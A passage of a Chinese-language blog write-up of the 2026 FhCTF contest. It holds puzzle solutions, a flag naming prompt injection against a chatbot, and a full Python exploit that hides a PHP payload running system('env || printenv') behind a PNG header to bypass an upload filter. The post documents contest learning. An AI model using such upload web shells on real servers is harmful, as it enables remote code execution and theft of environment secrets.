img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="itouSouta" type="application/atom+xml"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/avatar.jpg" width="120" height="120"><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"><script async src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">網頁</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.itousouta15.tw" title="BLOG"><img class="back-menu-item-icon" src="/img/banner.webp" alt="BLOG"><span class="back-menu-item-text">BLOG</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://SCAICT.org" title="SCAICT 中電會"><img class="back-menu-item-icon" src="https://scaict.org/src/img/logo.svg" alt="SCAICT 中電會"><span class="back-menu-item-text">SCAICT 中電會</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">社群連結</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://x.com/itou_souta15" title="X (Twitter)"><img class="back-menu-item-icon" src="https://raw.githubusercontent.com/ant-design/ant-design-icons/080054b2dbcd56e413b2b89ef1a90bf79b20303f/packages/icons-svg/svg/filled/x.svg" alt="X (Twitter)"><span class="back-menu-item-text">X (Twitter)</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/itousouta15" title="GitHub"><img class="back-menu-item-icon" src="https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png" alt="GitHub"><span class="back-menu-item-text">GitHub</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://discord.gg/uAX6h9VmA4" title="Discord"><img class="back-menu-item-icon" src="https://www.svgrepo.com/show/353655/discord-icon.svg" alt="Discord"><span class="back-menu-item-text">Discord</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.threads.net/@itou.souta15" title="Threads"><img class="back-menu-item-icon" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/threads-app-icon.png" alt="Threads"><span class="back-menu-item-text">Threads</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://instagram.com/itousouta15" title="Instagram"><img class="back-menu-item-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/960px-Instagram_logo_2022.svg.png?20220518162235" alt="Instagram"><span class="back-menu-item-text">Instagram</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h" data-pjax-state="external"><div class="title">itouSouta</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET={CONFIG:{modules:"0124",background:"2",tmpColor:"FFFFFF",tmpSize:"16",cityColor:"FFFFFF",citySize:"16",aqiColor:"E8D87B",aqiSize:"16",weatherIconSize:"24",alertIconSize:"18",padding:"10px 10px 10px 10px",shadow:"0",language:"auto",borderRadius:"20",fixed:"true",vertical:"top",horizontal:"left",left:"20",top:"7.1",key:"df245676fb434a0691ead1c63341cd94"}}</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size:.9em"></i><span> 歸檔</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size:.9em"></i><span> 分類</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size:.9em"></i><span> 標籤</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>朋友</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size:.9em"></i><span> 夥伴們</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size:.9em"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>關於</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size:.9em"></i><span> 本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size:.9em"></i><span> 碎碎念</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size:.9em"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="隨機前往一個開往專案網站"><a class="site-page" onclick="anzhiyu.totraveling()" title="隨機前往一個開往專案網站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="隨機前往一個文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜尋🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜尋</span></a></div><input id="center-console" type="checkbox"><label class="widget" for="center-console" title="控制台" onclick="anzhiyu.switchConsole()"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title">最新評論</span></div><div class="aside-list"><span>正在載入中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">興趣點</div><span class="author-content-item-title">尋找你感興趣的領域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AIS3/" style="font-size:1.05rem">AIS3<sup>1</sup></a><a href="/tags/Hexo/" style="font-size:1.05rem">Hexo<sup>2</sup></a><a href="/tags/Zerojudge/" style="font-size:1.05rem">Zerojudge<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/" style="font-size:1.05rem">前端開發<sup>2</sup></a><a href="/tags/%E8%B3%87%E5%AE%89/" style="font-size:1.05rem">資安<sup>2</sup></a></div></div><hr></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>歸檔</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/01/"><span class="card-archive-list-date">一月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">八月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">七月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="顯示模式切換" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="邊欄顯示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切換"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原創</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E8%A1%93%E5%88%86%E4%BA%AB/" itemprop="url">技術分享</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url"> <span><i class="anzhiyufont anzhiyu-icon-hashtag"></i>資安</span></a></span></div></div><h1 class="post-title" itemprop="name headline">FhCTF 11401</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">發表於</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2026-01-01T00:00:00.000Z" title="發表於 2026-01-01 00:00:00">2026-01-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新於</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-02-22T12:29:07.508Z" title="更新於 2026-02-22 12:29:07">2026-02-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字數總計:</span><span class="word-count" title="文章字数">12.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">閱讀時長:</span><span>52分鐘</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" data-flag-title="FhCTF 11401"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">閱讀量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator"> </span><span class="post-meta-position" title="作者IP属地为台灣"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>台灣</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/FhCTF.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://itousouta15.tw/2026/01/01/FhCTF/"><header><a class="post-meta-categories" href="/categories/%E6%8A%80%E8%A1%93%E5%88%86%E4%BA%AB/" itemprop="url">技術分享</a><a href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url">資安</a><h1 id="CrawlerTitle" itemprop="name headline">FhCTF 11401</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">伊藤蒼太</span><time itemprop="dateCreated datePublished" datetime="2026-01-01T00:00:00.000Z" title="發表於 2026-01-01 00:00:00">2026-01-01</time><time itemprop="dateCreated datePublished" datetime="2026-02-22T12:29:07.508Z" title="更新於 2026-02-22 12:29:07">2026-02-22</time></header><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2026 FhCTF / Team CTF</span><br><span class="line">01.01 – 01.05</span><br><span class="line"></span><br><span class="line">Group - --------------------------開放團訂麥當勞底下留言+1--------------------------</span><br><span class="line">Final — Rank 1（Top 1）</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h3><p><img src="/img/FhCTF/1.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">並看如何發放獎勵。</span><br><span class="line"></span><br><span class="line">    FhCTF&#123;S3n1ty_Ch3ck1ng....😝&#125;</span><br><span class="line"></span><br><span class="line">感謝本次活動 ISIP.HS 的支援與贊助。</span><br></pre></td></tr></table></figure><h3 id="Christmas-Tree"><a href="#Christmas-Tree" class="headerlink" title="Christmas Tree"></a>Christmas Tree</h3><p>經典的霍夫曼編碼題</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&#x27;encoded_gift.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    encoded = f.read().strip()</span><br><span class="line"></span><br><span class="line">with open(&#x27;huffman_tree.json&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    huffman_tree = json.load(f)</span><br><span class="line">    </span><br><span class="line">def decode_huffman(encoded_data, tree):</span><br><span class="line">    decoded = []</span><br><span class="line">    current = tree</span><br><span class="line"></span><br><span class="line">    for bit in encoded_data:</span><br><span class="line">        current = current[bit]</span><br><span class="line"></span><br><span class="line">        if isinstance(current, str):</span><br><span class="line">            decoded.append(current)</span><br><span class="line">            current = tree</span><br><span class="line"></span><br><span class="line">    return &#x27;&#x27;.join(decoded)</span><br><span class="line"></span><br><span class="line">decoded_message = decode_huffman(encoded, huffman_tree)</span><br><span class="line">print(f&quot;Decoded message: &#123;decoded_message&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Hoffman_is_a_great_Christmas_tree&#125;</span><br></pre></td></tr></table></figure><p><strong>我要吐槽一點霍夫曼編碼的英文是”Huffman”不是”Hoffman”</strong></p><h3 id="駭客的密碼食譜"><a href="#駭客的密碼食譜" class="headerlink" title="駭客的密碼食譜"></a>駭客的密碼食譜</h3><p>將每個食材的數值轉換成 ASCII 字元：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">125 → &#125;</span><br><span class="line">110 → n</span><br><span class="line">117 → u</span><br><span class="line">102 → f</span><br><span class="line">95 → _</span><br><span class="line">115 → s</span><br><span class="line">105 → i</span><br><span class="line">95 → _</span><br><span class="line">103 → g</span><br><span class="line">110 → n</span><br><span class="line">105 → i</span><br><span class="line">107 → k</span><br><span class="line">111 → o</span><br><span class="line">111 → o</span><br><span class="line">99 → c</span><br><span class="line">123 → &#123;</span><br><span class="line">70 → F</span><br><span class="line">84 → T</span><br><span class="line">67 → C</span><br><span class="line">104 → h</span><br><span class="line">70 → F</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;cooking_is_fun&#125;</span><br></pre></td></tr></table></figure><h3 id="笑話大師"><a href="#笑話大師" class="headerlink" title="笑話大師"></a>笑話大師</h3><p><strong>恭喜這題被評為最鳥的一題</strong><br><del>我就只是輸入一個?</del><br><img src="/img/FhCTF/2.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;thisi_Prompt_Injection&#125;</span><br></pre></td></tr></table></figure><h3 id="分享圖庫"><a href="#分享圖庫" class="headerlink" title="分享圖庫"></a>分享圖庫</h3><p>一進來我們可以看到這個介面只允許 PNG 上傳<br><img src="/img/FhCTF/3.webp" alt="image"><br>發現 PNG 有固定的 8 字節標頭，那我們就可以在標頭之後添加 PHP 代碼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">png_header = (</span><br><span class="line">    b&#x27;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52&#x27;</span><br><span class="line">    b&#x27;\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4&#x27;</span><br><span class="line">    b&#x27;\x89\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00&#x27;</span><br><span class="line">    b&#x27;\x05\x00\x01\x0D\x0A\x2D\xB4\x00\x00\x00\x00\x49\x45\x4E\x44\xAE&#x27;</span><br><span class="line">    b&#x27;\x42\x60\x82&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>構建 PHP Payload: 嘗試多種指令讀取方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">php_code = b<span class="string">&#x27;\n\n&lt;pre&gt;__START__\n&lt;?php system(&quot;env || printenv&quot;); ?&gt;\n__END__&lt;/pre&gt;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">file_content = png_header + php_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(f<span class="string">&quot;[*] Uploading payload to &#123;UPLOAD_URL&#125;...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    files = &#123;<span class="string">&#x27;fileToUpload&#x27;</span>: (FILENAME, file_content, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Upload Image&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(UPLOAD_URL, files=files, data=data, timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;has been uploaded&quot;</span> in r.text:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;[+] Upload ful!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[-] Upload failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;Status Code: &#123;r.status_code&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;Response Snippet:&quot;</span>, r.text[:<span class="number">300</span>])</span><br><span class="line">        sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    exploit_url = TARGET_URL + <span class="string">&quot;uploads/&quot;</span> + FILENAME</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[*] Executing payload at &#123;exploit_url&#125;...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    r_exec = requests.<span class="title function_ invoke__">get</span>(exploit_url, timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> r_exec.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[-] Error: 404 Not Found.&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;    The file might have been deleted by cleanup scripts or the upload path is different.&quot;</span>)</span><br><span class="line">        sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    content = r_exec.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    flag_match = re.<span class="title function_ invoke__">search</span>(r<span class="string">&#x27;(FhCTF\&#123;.*?\&#125;)&#x27;</span>, content)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag_match:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;\n[] Flag found:\n&#123;flag_match.group(1)&#125;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        start = content.<span class="title function_ invoke__">find</span>(<span class="string">&quot;__START__&quot;</span>)</span><br><span class="line">        end = content.<span class="title function_ invoke__">find</span>(<span class="string">&quot;__END__&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start != -<span class="number">1</span> <span class="keyword">and</span> end != -<span class="number">1</span>:</span><br><span class="line">            output = content[start+<span class="number">9</span>:end].<span class="title function_ invoke__">strip</span>()</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;\n[+] Command Output (env):&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(output)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> in output.<span class="title function_ invoke__">lower</span>():</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;\n[!] &#x27;flag&#x27; keyword found in output, please check manually above.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;\n[-] Flag pattern not found automatically.&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;Raw response preview (check manually):&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(content[:<span class="number">500</span>])</span><br><span class="line"></span><br><span class="line">except requests.exceptions.ConnectionError:</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;\n[-] Connection Error: Could not connect to &#123;TARGET_URL&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;    Please check if the CTF instance is still running or if the URL has changed.&quot;</span>)</span><br><span class="line">except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;\n[-] An error occurred: &#123;e&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 